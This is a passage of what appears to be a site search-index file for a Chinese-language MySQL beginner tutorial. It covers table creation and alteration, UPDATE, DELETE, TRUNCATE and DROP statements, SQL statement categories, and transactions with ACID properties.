\u5b57\u6bb5\u540d \u5b57\u6bb5\u7c7b\u578b [first|after \u5b57\u6bb5\u540d]; mysql> alter table t1 add sex char(10); mysql> desc t1; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | YES | | NULL | | | name | char(10) | YES | | NULL | | | sex | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ 3 rows in set (0.01 sec) \uff082\uff09\u5c06\u5b57\u6bb5\u6dfb\u52a0\u4e3a\u8868\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bb5 mysql> alter table t1 add qq int first; \uff083\uff09 \u5728\u67d0\u4e2a\u5b57\u6bb5\u7684\u540e\u9762\u65b0\u589e\u5b57\u6bb5 mysql> alter table t1 add tel int(15) after qq; b\u3001\u4fee\u6539\u5b57\u6bb5\u5c5e\u6027 change\uff1a\u65e2\u80fd\u4fee\u6539\u5b57\u6bb5\u7684\u7c7b\u578b\u548c\u957f\u5ea6\uff0c\u53c8\u80fd\u4fee\u6539\u5b57\u6bb5\u7684\u540d\u5b57 modify\uff1a\u53ea\u80fd\u4fee\u6539\u5b57\u6bb5\u7684\u7c7b\u578b\u548c\u957f\u5ea6 modify\u7684\u8bed\u6cd5\uff1a alter table \u8868\u540d modify \u5b57\u6bb5\u540d \u5b57\u6bb5\u7c7b\u578b; mysql> alter table t1 modify name char(15); change\u7684\u8bed\u6cd5\uff1a alter table \u8868\u540d change \u539f\u5b57\u6bb5\u540d \u65b0\u5b57\u6bb5\u540d \u5b57\u6bb5\u7c7b\u578b \u6ce8\u610f\uff1a\u5982\u679c\u53ea\u4fee\u6539\u5b57\u6bb5\u7c7b\u578b\uff0c\u90a3\u4e48\u539f\u5b57\u6bb5\u540d\u548c\u65b0\u5b57\u6bb5\u540d\u4e00\u6837 \u5982\u679c\u53ea\u4fee\u6539\u5b57\u6bb5\u540d\u5b57\uff0c\u90a3\u4e48\u5b57\u6bb5\u7c7b\u578b\u4e0e\u539f\u6765\u7684\u5b57\u6bb5\u7c7b\u578b\u4fdd\u6301\u4e00\u81f4 mysql> alter table t1 change qq weixin int; c\u3001\u5220\u9664\u5b57\u6bb5 \u8bed\u6cd5\uff1aalter table \u8868\u540d drop \u5b57\u6bb5\u540d; mysql> alter table t1 drop sex; 7\uff09\u4fee\u6539\u8868\u540d \u8bed\u6cd5\uff1aalter table \u8868\u540d rename \u65b0\u8868\u540d; mysql> alter table t1 rename t22; mysql> select * from t1; ERROR 1146 (42S02): Table 'test.t1' doesn't exist 8\uff09\u66f4\u65b0\u8868\u4e2d\u7684\u6570\u636e(update) \u8bed\u6cd5\uff1aupdate \u8868\u540d set \u5b57\u6bb5\u540d=\u503c[,\u5b57\u6bb5\u540d2=\u503c2] where \u6761\u4ef6; mysql> update t22 set name='HanMeimei' where id=250; mysql> update t22 set weixin=1234567; //\u4f1a\u5c06\u8be5\u8868\u4e2d\u8fd9\u6bb5\u5b57\u6bb5\u7684\u503c\u5168\u90e8\u4fee\u6539\u4e3a1234567 mysql> update t22 set id=2,name='HanMei' where id=250; //\u540c\u65f6\u4fee\u6539\u591a\u4e2a\u5b57\u6bb5 9\uff09\u5220\u9664\u8868\u4e2d\u8bb0\u5f55 delete \uff081\uff09\u5220\u9664\u8868\u4e2d\u6307\u5b9a\u884c mysql> delete from t22 where id>=3; Query OK, 4 rows affected (0.01 sec) \uff082\uff09\u5220\u9664\u8868\u4e2d\u5168\u90e8\u6570\u636e mysql> delete from t22; mysql> select * from t22; Empty set (0.00 sec) 10\uff09\u622a\u65ad\u8868 truncate \u4e5f\u662f\u5220\u9664\u8868\u4e2d\u7684\u5168\u90e8\u8bb0\u5f55 mysql> create table test (id int); mysql> insert into test values(); //\u5411\u8868\u4e2d\u63d2\u5165\u7a7a\u503c mysql> insert into test values(); mysql> insert into test values(); mysql> select * from test; mysql> truncate table test; mysql> select * from test; delete\u548ctruncate\u533a\u522b delete\uff1aDML\uff0c\u53ef\u4ee5\u56de\u6eda truncate\uff1aDDL\uff0c\u4e0d\u80fd\u591f\u56de\u6eda\u7684\uff0c\u5220\u9664\u6570\u636e\u7684\u540c\u65f6\u4f1a\u91ca\u653e\u7a7a\u95f4\u3002 \u5927\u8868\u6570\u636e\u6e05\u9664\u65f6\u5019\uff0c\u4e00\u5b9a\u8981\u7528truncate\uff0c\u901f\u5ea6\u5feb\u3002 11\uff09\u5220\u9664\u8868 drop table \u8868\u540d; mysql> drop table test; mysql> drop table t22;","title":"\u57fa\u672c\u8bed\u6cd5"},{"location":"database/mysql/basic/#sql","text":"(Structured Query Language) \u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00 \u4e13\u95e8\u7528\u6765\u548c\u5173\u7cfb\u578b\u6570\u636e\u5e93\u8fdb\u884c\u901a\u4fe1\u7684\u8bed\u8a00","title":"SQL"},{"location":"database/mysql/basic/#sql_1","text":"1\uff09\u5173\u952e\u5b57\u3001\u51fd\u6570\u540d\u3001\u5217\u540d\u548c\u7d22\u5f15\u540d\u4e0d\u533a\u5206\u5927\u5c0f\u5199 2\uff09\u6570\u636e\u5e93\u540d\u3001\u8868\u540d\u3001\u522b\u540d\u53ca\u89c6\u56fe\u540d\u533a\u5206\u5927\u5c0f\u5199\u7684(\u56e0\u4e3alinux\u7cfb\u7edf\u662f\u533a\u5206\u5927\u5c0f\u5199\u7684) 3\uff09\u5b58\u50a8\u8fc7\u7a0b\u3001\u4e8b\u4ef6\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff0c\u89e6\u53d1\u5668\u533a\u5206\u5927\u5c0f\u5199\u3002","title":"SQL\u8bed\u53e5\u4e2d\u7684\u5927\u5c0f\u5199\u95ee\u9898\uff1a"},{"location":"database/mysql/basic/#sql_2","text":"","title":"SQL\u8bed\u53e5\u7684\u5206\u7c7b"},{"location":"database/mysql/basic/#1-dql","text":"\u6570\u636e\u67e5\u8be2\u8bed\u8a00DQL\u57fa\u672c\u7ed3\u6784\u662f\u7531SELECT\u5b50\u53e5\uff0cFROM\u5b50\u53e5\uff0cWHERE\uff0c\u5b50\u53e5\u7ec4\u6210\u7684\u67e5\u8be2\u5757\uff1a SELECT <\u5b57\u6bb5\u540d\u8868> FROM <\u8868\u6216\u89c6\u56fe\u540d> WHERE <\u67e5\u8be2\u6761\u4ef6>","title":"1. \u6570\u636e\u67e5\u8be2\u8bed\u8a00DQL"},{"location":"database/mysql/basic/#2-dml","text":"\u6570\u636e\u64cd\u7eb5\u8bed\u8a00DML\u4e3b\u8981\u6709\u4e09\u79cd\u5f62\u5f0f\uff1a 1) \u63d2\u5165\uff1aINSERT 2) \u66f4\u65b0\uff1aUPDATE 3) \u5220\u9664\uff1aDELETE","title":"2 .\u6570\u636e\u64cd\u7eb5\u8bed\u8a00DML"},{"location":"database/mysql/basic/#3-ddl","text":"\u6570\u636e\u5b9a\u4e49\u8bed\u8a00DDL\u7528\u6765\u521b\u5efa\u6570\u636e\u5e93\u4e2d\u7684\u5404\u79cd\u5bf9\u8c61-----\u8868\u3001\u89c6\u56fe\u3001\u7d22\u5f15\u3001\u540c\u4e49\u8bcd\u3001\u805a\u7c07\u7b49\u5982\uff1a create TABLE/VIEW/INDEX/SYN/CLUSTER \u521b\u5efa alter \u4fee\u6539 drop \u5220\u9664 truncate \u622a\u65ad DDL\u64cd\u4f5c\u662f\u9690\u6027\u63d0\u4ea4\u7684\uff01\u4e0d\u80fdrollback","title":"3. \u6570\u636e\u5b9a\u4e49\u8bed\u8a00DDL"},{"location":"database/mysql/basic/#4-dcl","text":"\u6570\u636e\u63a7\u5236\u8bed\u8a00DCL\u7528\u6765\u6388\u4e88\u6216\u56de\u6536\u8bbf\u95ee\u6570\u636e\u5e93\u7684\u67d0\u79cd\u7279\u6743\uff0c\u5e76\u63a7\u5236\u6570\u636e\u5e93\u64cd\u7eb5\u4e8b\u52a1\u53d1\u751f\u7684\u65f6\u95f4\u53ca\u6548\u679c\uff0c\u5bf9\u6570\u636e\u5e93\u5b9e\u884c\u76d1\u89c6\u7b49\u3002\u5982\uff1a 1) grant\uff1a \u6388\u6743\u3002 revoke \u56de\u6536\u6743\u9650 2) ROLLBACK [WORK] TO [SAVEPOINT]\uff1a\u56de\u9000\u5230\u67d0\u4e00\u70b9\u3002 \u56de\u6eda---ROLLBACK \u56de\u6eda\u547d\u4ee4\u4f7f\u6570\u636e\u5e93\u72b6\u6001\u56de\u5230\u4e0a\u6b21\u6700\u540e\u63d0\u4ea4\u7684\u72b6\u6001\u3002\u5176\u683c\u5f0f\u4e3a\uff1a SQL>ROLLBACK; 3) COMMIT [WORK]\uff1a\u63d0\u4ea4\u3002 \u5728\u6570\u636e\u5e93\u7684\u63d2\u5165\u3001\u5220\u9664\u548c\u4fee\u6539\u64cd\u4f5c\u65f6\uff0c\u53ea\u6709\u5f53\u4e8b\u52a1\u5728\u63d0\u4ea4\u5230\u6570\u636e\u5e93\u65f6\u624d\u7b97\u5b8c\u6210\u3002\u5728\u4e8b\u52a1\u63d0\u4ea4\u524d\uff0c\u53ea\u6709\u64cd\u4f5c\u6570\u636e\u5e93\u7684\u8fd9\u4e2a\u4eba\u624d\u80fd\u6709\u6743\u770b\u5230\u6240\u505a\u7684\u4e8b\u60c5\uff0c\u522b\u4eba\u53ea\u6709\u5728\u6700\u540e\u63d0\u4ea4\u5b8c\u6210\u540e\u624d\u53ef\u4ee5\u770b\u5230\u3002\u63d0\u4ea4\u6570\u636e\u6709\u4e09\u79cd\u7c7b\u578b\uff1a\u663e\u5f0f\u63d0\u4ea4\u3001\u9690\u5f0f\u63d0\u4ea4\u53ca\u81ea\u52a8\u63d0\u4ea4\u3002\u4e0b\u9762\u5206\u522b\u8bf4\u660e\u8fd9\u4e09\u79cd\u7c7b\u578b\u3002 (1) \u663e\u5f0f\u63d0\u4ea4 \u7528COMMIT\u547d\u4ee4\u76f4\u63a5\u5b8c\u6210\u7684\u63d0\u4ea4\u4e3a\u663e\u5f0f\u63d0\u4ea4\u3002\u5176\u683c\u5f0f\u4e3a\uff1a SQL>COMMIT\uff1b (2) \u9690\u5f0f\u63d0\u4ea4 \u7528SQL\u547d\u4ee4\u95f4\u63a5\u5b8c\u6210\u7684\u63d0\u4ea4\u4e3a\u9690\u5f0f\u63d0\u4ea4\u3002\u8fd9\u4e9b\u547d\u4ee4\u662f\uff1a ALTER\uff0cAUDIT\uff0cCOMMENT\uff0cCONNECT\uff0cCREATE\uff0cDISCONNECT\uff0cDROP\uff0c EXIT\uff0cGRANT\uff0cNOAUDIT\uff0cQUIT\uff0cREVOKE\uff0cRENAME\u3002 (3) \u81ea\u52a8\u63d0\u4ea4 \u82e5\u628aAUTOCOMMIT\u8bbe\u7f6e\u4e3aON\uff0c\u5219\u5728\u63d2\u5165\u3001\u4fee\u6539\u3001\u5220\u9664\u8bed\u53e5\u6267\u884c\u540e\uff0c\u7cfb\u7edf\u5c06\u81ea\u52a8\u8fdb\u884c\u63d0\u4ea4\uff0c\u8fd9\u5c31\u662f\u81ea\u52a8\u63d0\u4ea4\u3002\u5176\u683c\u5f0f\u4e3a\uff1a SQL>SET AUTOCOMMIT ON\uff1b","title":"4. \u6570\u636e\u63a7\u5236\u8bed\u8a00DCL"},{"location":"database/mysql/basic/#mysql","text":"MySQL \u4e8b\u52a1\u4e3b\u8981\u7528\u4e8e\u5904\u7406\u64cd\u4f5c\u91cf\u5927\uff0c\u590d\u6742\u5ea6\u9ad8\u7684\u6570\u636e\u3002\u6bd4\u5982\u8bf4\uff0c\u5728\u4eba\u5458\u7ba1\u7406\u7cfb\u7edf\u4e2d\uff0c\u4f60\u5220\u9664\u4e00\u4e2a\u4eba\u5458\uff0c\u4f60\u65e2\u9700\u8981\u5220\u9664\u4eba\u5458\u7684\u57fa\u672c\u8d44\u6599\uff0c\u4e5f\u8981\u5220\u9664\u548c\u8be5\u4eba\u5458\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u5982\u4fe1\u7bb1\uff0c\u6587\u7ae0\u7b49\u7b49\uff0c\u8fd9\u6837\uff0c\u8fd9\u4e9b\u6570\u636e\u5e93\u64cd\u4f5c\u8bed\u53e5\u5c31\u6784\u6210\u4e00\u4e2a\u4e8b\u52a1\uff01 \u5728 MySQL \u4e2d\u53ea\u6709\u4f7f\u7528\u4e86 Innodb \u6570\u636e\u5e93\u5f15\u64ce\u7684\u6570\u636e\u5e93\u6216\u8868\u624d\u652f\u6301\u4e8b\u52a1\u3002 \u4e8b\u52a1\u5904\u7406\u53ef\u4ee5\u7528\u6765\u7ef4\u62a4\u6570\u636e\u5e93\u7684\u5b8c\u6574\u6027\uff0c\u4fdd\u8bc1\u6210\u6279\u7684 SQL \u8bed\u53e5\u8981\u4e48\u5168\u90e8\u6267\u884c\uff0c\u8981\u4e48\u5168\u90e8\u4e0d\u6267\u884c\u3002 \u4e8b\u52a1\u7528\u6765\u7ba1\u7406 insert,update,delete \u8bed\u53e5 \u4e00\u822c\u6765\u8bf4\uff0c\u4e8b\u52a1\u662f\u5fc5\u987b\u6ee1\u8db34\u4e2a\u6761\u4ef6\uff08ACID\uff09\uff1a \u539f\u5b50\u6027\uff08Atomicity\uff0c\u6216\u79f0\u4e0d\u53ef\u5206\u5272\u6027\uff09\u3001\u4e00\u81f4\u6027\uff08Consistency\uff09\u3001\u9694\u79bb\u6027\uff08Isolation\uff0c\u53c8\u79f0\u72ec\u7acb\u6027\uff09\u3001\u6301\u4e45\u6027\uff08Durability\uff09\u3002 \u539f\u5b50\u6027\uff1a\u4e00\u4e2a\u4e8b\u52a1\uff08transaction\uff09\u4e2d\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u8981\u4e48\u5168\u90e8\u5b8c\u6210\uff0c\u8981\u4e48\u5168\u90e8\u4e0d\u5b8c\u6210\uff0c\u4e0d\u4f1a\u7ed3\u675f\u5728\u4e2d\u95f4\u67d0\u4e2a\u73af\u8282\u3002\u4e8b\u52a1\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef\uff0c\u4f1a\u88ab\u56de\u6eda\uff08Rollback\uff09\u5230\u4e8b\u52a1\u5f00\u59cb\u524d\u7684\u72b6\u6001\uff0c\u5c31\u50cf\u8fd9\u4e2a\u4e8b\u52a1\u4ece\u6765\u6ca1\u6709\u6267\u884c\u8fc7\u4e00\u6837\u3002 \u4e00\u81f4\u6027\uff1a\u5728\u4e8b\u52a1\u5f00\u59cb\u4e4b\u524d\u548c\u4e8b\u52a1\u7ed3\u675f\u4ee5\u540e\uff0c\u6570\u636e\u5e93\u7684\u5b8c\u6574\u6027\u6ca1\u6709\u88ab\u7834\u574f\u3002\u8fd9\u8868\u793a\u5199\u5165\u7684\u8d44\u6599\u5fc5\u987b\u5b8c\u5168\u7b26\u5408\u6240\u6709\u7684\u9884\u8bbe\u89c4\u5219\uff0c\u8fd9\u5305\u542b\u8d44\u6599\u7684\u7cbe\u786e\u5ea6\u3001\u4e32\u8054\u6027\u4ee5\u53ca\u540e\u7eed\u6570\u636e\u5e93\u53ef\u4ee5\u81ea\u53d1\u6027\u5730\u5b8c\u6210\u9884\u5b9a\u7684\u5de5\u4f5c\u3002 \u9694\u79bb\u6027\uff1a\u6570\u636e\u5e93\u5141\u8bb8\u591a\u4e2a\u5e76\u53d1\u4e8b\u52a1\u540c\u65f6\u5bf9\u5176\u6570\u636e\u8fdb\u884c\u8bfb\u5199\u548c\u4fee\u6539\u7684\u80fd\u529b\uff0c\u9694\u79bb\u6027\u53ef\u4ee5\u9632\u6b62\u591a\u4e2a\u4e8b\u52a1\u5e76\u53d1\u6267\u884c\u65f6\u7531\u4e8e\u4ea4\u53c9\u6267\u884c\u800c\u5bfc\u81f4\u6570\u636e\u7684\u4e0d\u4e00\u81f4\u3002\u4e8b\u52a1\u9694\u79bb\u5206\u4e3a\u4e0d\u540c\u7ea7\u522b\uff0c\u5305\u62ec\u8bfb\u672a\u63d0\u4ea4\uff08Read uncommitted\uff09\u3001\u8bfb\u63d0\u4ea4\uff08read committed\uff09\u3001\u53ef\u91cd\u590d\u8bfb\uff08repeatable read\uff09\u548c\u4e32\u884c\u5316\uff08Serializable\uff09\u3002 \u6301\u4e45\u6027\uff1a\u4e8b\u52a1\u5904\u7406\u7ed3\u675f\u540e\uff0c\u5bf9\u6570\u636e\u7684\u4fee\u6539\u5c31\u662f\u6c38\u4e45\u7684\uff0c\u5373\u4fbf\u7cfb\u7edf\u6545\u969c\u4e5f\u4e0d\u4f1a\u4e22\u5931\u3002 \u5728 MySQL \u547d\u4ee4\u884c\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\uff0c\u4e8b\u52a1\u90fd\u662f\u81ea\u52a8\u63d0\u4ea4\u7684\uff0c\u5373\u6267\u884c SQL \u8bed\u53e5\u540e\u5c31\u4f1a\u9a6c\u4e0a\u6267\u884c COMMIT \u64cd\u4f5c\u3002\u56e0\u6b64\u8981\u663e\u5f0f\u5730\u5f00\u542f\u4e00\u4e2a\u4e8b\u52a1\u52a1\u987b\u4f7f\u7528\u547d\u4ee4 BEGIN \u6216 START TRANSACTION\uff0c\u6216\u8005\u6267\u884c\u547d\u4ee4 SET AUTOCOMMIT=0\uff0c\u7528\u6765\u7981\u6b62\u4f7f\u7528\u5f53\u524d\u4f1a\u8bdd\u7684\u81ea\u52a8\u63d0\u4ea4\u3002","title":"MySQL \u4e8b\u52a1"},{"location":"database/mysql/basic/#sql_3","text":"","title":"\u57fa\u672cSQL\u8bed\u53e5"},{"location":"database/mysql/basic/#1","text":"[root@mysql mysql]# mysql -u root -p123456 mysql> select user(); +----------------+ | user() | +----------------+ | root@localhost | +----------------+ 1 row in set (0.00 sec)","title":"1\u3001\u67e5\u770b\u5f53\u524d\u7528\u6237"},{"location":"database/mysql/basic/#2","text":"","title":"2\u3001\u5bf9\u6570\u636e\u5e93\u7684\u64cd\u4f5c"},{"location":"database/mysql/basic/#1_1","text":"mysql> select database(); +------------+ | database() | +------------+ | NULL | +------------+ 1 row in set (0.00 sec)","title":"1\uff09\u67e5\u770b\u5f53\u524d\u64cd\u4f5c\u7684\u6570\u636e\u5e93"},{"location":"database/mysql/basic/#2_1","text":"mysql> use test Database changed","title":"2\uff09\u9009\u62e9\u64cd\u4f5c\u54ea\u4e2a\u6570\u636e\u5e93"},{"location":"database/mysql/basic/#3","text":"mysql> show databases; +--------------------+ | Database | +--------------------+ | information_schema | \u4fe1\u606f\u6a21\u5f0f\u6570\u636e\u5e93\uff0c\u4fdd\u5b58\u670d\u52a1\u5668\u7684\u4fe1\u606f | mysql | \u6838\u5fc3\u7ba1\u7406\u6570\u636e\u5e93\uff0c\u4fdd\u5b58\u4e86\u7528\u6237\u548c\u6743\u9650\u4fe1\u606f\uff0c\u8bb0\u5f55\u4e86\u548c\u7cfb\u7edf\u5b89\u5168\u76f8\u5173\u7684\u4fe1\u606f | performance_schema | \u6027\u80fd\u6a21\u5f0f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u670d\u52a1\u5668\u7684\u6027\u80fd\u53c2\u6570 | test | \u6d4b\u8bd5\u6570\u636e\u5e93 +--------------------+ 4 rows in set (0.02 sec)","title":"3\uff09\u67e5\u770b\u7cfb\u7edf\u4e2d\u6709\u54ea\u4e9b\u6570\u636e\u5e93"},{"location":"database/mysql/basic/#4","text":"mysql> show tables; Empty set (0.02 sec)","title":"4\uff09\u67e5\u770b\u5f53\u524d\u6570\u636e\u5e93\u4e0b\u6709\u54ea\u4e9b\u8868"},{"location":"database/mysql/basic/#5","text":"mysql> create database updb1; Query OK, 1 row affected (0.01 sec) \u6ce8\u610f\uff1a\u5728\u540c\u4e00\u4e2a\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u4e2d\u6570\u636e\u5e93\u540d\u4e0d\u80fd\u91cd\u590d","title":"5\uff09\u521b\u5efa\u6570\u636e\u5e93"},{"location":"database/mysql/basic/#6","text":"(\u8f7b\u6613\u522b\u8fd9\u4e48\u505a\uff0c\u98ce\u9669\u5927) mysql> drop database updb1; Query OK, 0 rows affected (0.04 sec)","title":"6\uff09\u5220\u9664\u6570\u636e\u5e93"},{"location":"database/mysql/basic/#3_1","text":"\u6ce8\u610f\uff1a 1\uff09\u8868\u4e00\u5b9a\u8981\u5b58\u5728\u6570\u636e\u5e93\u4e2d 2\uff09\u5728\u540c\u4e00\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u8868\u540d\u4e0d\u80fd\u91cd\u590d","title":"3\u3001\u5bf9\u8868\u7684\u64cd\u4f5c"},{"location":"database/mysql/basic/#1_2","text":"\u8bed\u6cd5\uff1acreate table \u8868\u540d (\u5b57\u6bb51\u540d \u5b57\u6bb5\u7c7b\u578b,\u5b57\u6bb52\u540d \u5b57\u6bb5\u7c7b\u578b,... ...,\u5b57\u6bb5n\u540d \u5b57\u6bb5\u7c7b\u578b); mysql> use test; Database changed mysql> create table t1 (id int,name char(10)); Query OK, 0 rows affected (0.05 sec)","title":"1\uff09\u521b\u5efa\u8868(\u521b\u5efa\u7684\u662f\u8868\u7ed3\u6784)"},{"location":"database/mysql/basic/#2_2","text":"mysql> desc t1; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | YES | | NULL | | | name | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ 2 rows in set (0.00 sec) Field\uff1a\u5b57\u6bb5\u540d\u5b57 Type\uff1a\u5b57\u6bb5\u7c7b\u578b Null\uff1a\u662f\u5426\u5141\u8bb8\u4e3a\u7a7a Key\uff1a\u952e\u503c(\u4e3b\u952e\u7b49) Default\uff1a\u9ed8\u8ba4\u503c Extra\uff1a\u5176\u4ed6(\u81ea\u589e\u7b49)","title":"2\uff09\u67e5\u770b\u8868\u7ed3\u6784"},{"location":"database/mysql/basic/#3_2","text":"mysql> show create table t1\\G ******** 1. row ********* Table: t1 Create Table: CREATE TABLE t1 ( id int(11) DEFAULT NULL, name char(10) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8 1 row in set (0.00 sec) mysql> show create table mysql.user\\G mysql.user\uff1a\u5e93\u540d.\u8868\u540d","title":"3\uff09\u67e5\u770b\u5efa\u8868\u65f6\u4f7f\u7528\u7684\u8bed\u53e5"},{"location":"database/mysql/basic/#4_1","text":"a\u3001\u63d2\u5165\u6570\u636e\u65f6\uff0c\u4e0d\u6307\u5b9a\u5b57\u6bb5\uff0c\u5728\u5199\u503c\u7684\u65f6\u5019\u987a\u5e8f\u8981\u4e0e\u8868\u4e2d\u7684\u5b57\u6bb5\u7684\u987a\u5e8f\u4e00\u4e00\u5bf9\u5e94\uff0c\u503c\u7684\u6570\u91cf\u8981\u548c\u5b57\u6bb5\u6570\u4e00\u6837\u591a \u8bed\u6cd5\uff1ainsert into \u8868\u540d values \uff08\u503c1,\u503c2,......,\u503cn\uff09; mysql> insert into t1 values(1,'Tom'); Query OK, 1 row affected (0.00 sec) b\u3001\u63d2\u5165\u65f6\u6307\u5b9a\u5b57\u6bb5 \u8bed\u6cd5\uff1ainsert into \u8868\u540d(\u5b57\u6bb5\u540d1,\u5b57\u6bb5\u540d2,... ...,\u5b57\u6bb5\u540dn) values \uff08\u503c1,\u503c2,......,\u503cn\uff09; mysql> insert into t1(id) values(250); mysql> insert into t1(name,id) values('Mary',3); mysql> select * from t1; //\u67e5\u8be2t1\u8868\u4e2d\u7684\u6570\u636e +------+------+ | id | name | +------+------+ | 1 | Tom | | 250 | NULL | | 3 | Mary | +------+------+ 3 rows in set (0.00 sec) c\u3001\u5411\u8868\u4e2d\u63d2\u5165\u591a\u6761\u6570\u636e mysql> insert into t1 values(4,'jack'),(5,'Kite'),(7,'LiLei'); //\u540c\u65f6\u5411t1\u8868\u4e2d\u63d2\u5165\u4e09\u6761\u8bb0\u5f55","title":"4\uff09\u5411\u8868\u4e2d\u63d2\u5165\u6570\u636e"},{"location":"database/mysql/basic/#5_1","text":"mysql> select * from t1; //\u5168\u8868\u67e5\u8be2 mysql> select name from t1; //\u6307\u5b9a\u5b57\u6bb5\u67e5\u8be2 select \u540e\u9762\u63a5\u5b57\u6bb5\u540d\u5b57 mysql> select name,id from t1; //\u67e5\u8be2\u591a\u4e2a\u5b57\u6bb5","title":"5\uff09\u67e5\u8be2\u8868\u4e2d\u6570\u636e"},{"location":"database/mysql/basic/#6-alter","text":"","title":"6\uff09\u4fee\u6539\u8868\u7ed3\u6784    alter"},{"location":"database/mysql/basic/#a","text":"\uff081\uff09\u5411\u8868\u4e2d\u589e\u52a0\u5b57\u6bb5(\u9ed8\u8ba4\u6dfb\u52a0\u5230\u6700\u540e\u4e00\u4e2a\u5b57\u6bb5) \u8bed\u6cd5\uff1aalter table \u8868\u540d add \u5b57\u6bb5\u540d \u5b57\u6bb5\u7c7b\u578b [first|after \u5b57\u6bb5\u540d]; mysql> alter table t1 add sex char(10); mysql> desc t1; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | YES | | NULL | | | name | char(10) | YES | | NULL | | | sex | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ 3 rows in set (0.01 sec) \uff082\uff09\u5c06\u5b57\u6bb5\u6dfb\u52a0\u4e3a\u8868\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bb5 mysql> alter table t1 add qq int first; \uff083\uff09 \u5728\u67d0\u4e2a\u5b57\u6bb5\u7684\u540e\u9762\u65b0\u589e\u5b57\u6bb5 mysql> alter table t1 add tel int(15) after qq;","title":"a\u3001\u589e\u52a0\u5b57\u6bb5"},{"location":"database/mysql/basic/#b","text":"change\uff1a\u65e2\u80fd\u4fee\u6539\u5b57\u6bb5\u7684\u7c7b\u578b\u548c\u957f\u5ea6\uff0c\u53c8\u80fd\u4fee\u6539\u5b57\u6bb5\u7684\u540d\u5b57 modify\uff1a\u53ea\u80fd\u4fee\u6539\u5b57\u6bb5\u7684\u7c7b\u578b\u548c\u957f\u5ea6 modify\u7684\u8bed\u6cd5\uff1a alter table \u8868\u540d modify \u5b57\u6bb5\u540d \u5b57\u6bb5\u7c7b\u578b; mysql> alter table t1 modify name char(15); change\u7684\u8bed\u6cd5\uff1a alter table \u8868\u540d change \u539f\u5b57\u6bb5\u540d \u65b0\u5b57\u6bb5\u540d \u5b57\u6bb5\u7c7b\u578b \u6ce8\u610f\uff1a\u5982\u679c\u53ea\u4fee\u6539\u5b57\u6bb5\u7c7b\u578b\uff0c\u90a3\u4e48\u539f\u5b57\u6bb5\u540d\u548c\u65b0\u5b57\u6bb5\u540d\u4e00\u6837 \u5982\u679c\u53ea\u4fee\u6539\u5b57\u6bb5\u540d\u5b57\uff0c\u90a3\u4e48\u5b57\u6bb5\u7c7b\u578b\u4e0e\u539f\u6765\u7684\u5b57\u6bb5\u7c7b\u578b\u4fdd\u6301\u4e00\u81f4 mysql> alter table t1 change qq weixin int;","title":"b\u3001\u4fee\u6539\u5b57\u6bb5\u5c5e\u6027"},{"location":"database/mysql/basic/#c","text":"\u8bed\u6cd5\uff1aalter table \u8868\u540d drop \u5b57\u6bb5\u540d; mysql> alter table t1 drop sex;","title":"c\u3001\u5220\u9664\u5b57\u6bb5"},{"location":"database/mysql/basic/#7","text":"\u8bed\u6cd5\uff1aalter table \u8868\u540d rename \u65b0\u8868\u540d; mysql> alter table t1 rename t22; mysql> select * from t1; ERROR 1146 (42S02): Table 'test.t1' doesn't exist","title":"7\uff09\u4fee\u6539\u8868\u540d"},{"location":"database/mysql/basic/#8update","text":"\u8bed\u6cd5\uff1aupdate \u8868\u540d set \u5b57\u6bb5\u540d=\u503c[,\u5b57\u6bb5\u540d2=\u503c2] where \u6761\u4ef6; mysql> update t22 set name='HanMeimei' where id=250; mysql> update t22 set weixin=1234567; //\u4f1a\u5c06\u8be5\u8868\u4e2d\u8fd9\u6bb5\u5b57\u6bb5\u7684\u503c\u5168\u90e8\u4fee\u6539\u4e3a1234567 mysql> update t22 set id=2,name='HanMei' where id=250; //\u540c\u65f6\u4fee\u6539\u591a\u4e2a\u5b57\u6bb5","title":"8\uff09\u66f4\u65b0\u8868\u4e2d\u7684\u6570\u636e(update)"},{"location":"database/mysql/basic/#9-delete","text":"\uff081\uff09\u5220\u9664\u8868\u4e2d\u6307\u5b9a\u884c mysql> delete from t22 where id>=3; Query OK, 4 rows affected (0.01 sec) \uff082\uff09\u5220\u9664\u8868\u4e2d\u5168\u90e8\u6570\u636e mysql> delete from t22; mysql> select * from t22; Empty set (0.00 sec)","title":"9\uff09\u5220\u9664\u8868\u4e2d\u8bb0\u5f55  delete"},{"location":"database/mysql/basic/#10","text":"truncate \u4e5f\u662f\u5220\u9664\u8868\u4e2d\u7684\u5168\u90e8\u8bb0\u5f55 mysql> create table test (id int); mysql> insert into test values(); //\u5411\u8868\u4e2d\u63d2\u5165\u7a7a\u503c mysql> insert into test values(); mysql> insert into test values(); mysql> select * from test; mysql> truncate table test; mysql> select * from test; delete\u548ctruncate\u533a\u522b delete\uff1aDML\uff0c\u53ef\u4ee5\u56de\u6eda truncate\uff1aDDL\uff0c\u4e0d\u80fd\u591f\u56de\u6eda\u7684\uff0c\u5220\u9664\u6570\u636e\u7684\u540c\u65f6\u4f1a\u91ca\u653e\u7a7a\u95f4\u3002 \u5927\u8868\u6570\u636e\u6e05\u9664\u65f6\u5019\uff0c\u4e00\u5b9a\u8981\u7528truncate\uff0c\u901f\u5ea6\u5feb\u3002","title":"10\uff09\u622a\u65ad\u8868"},{"location":"database/mysql/basic/#11","text":"drop table \u8868\u540d; mysql> drop table test; mysql> drop table 